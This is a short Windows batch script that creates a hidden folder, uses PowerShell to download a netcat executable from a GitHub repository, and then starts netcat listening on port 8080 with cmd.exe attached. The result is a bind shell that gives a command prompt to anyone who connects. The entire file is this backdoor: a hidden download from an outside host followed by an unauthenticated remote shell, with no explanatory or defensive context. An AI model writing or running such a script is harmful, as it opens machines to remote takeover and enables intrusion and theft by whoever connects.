@echo off
mkdir C:\nc\
attrib +h C:\nc
powershell.exe (new-object System.Net.WebClient).DownloadFile('https://github.com/7ext34/7ext-34/raw/master/nc.exe','C:\nc\nc.exe')

C:\nc\nc.exe -lvp 8080 -e cmd.exe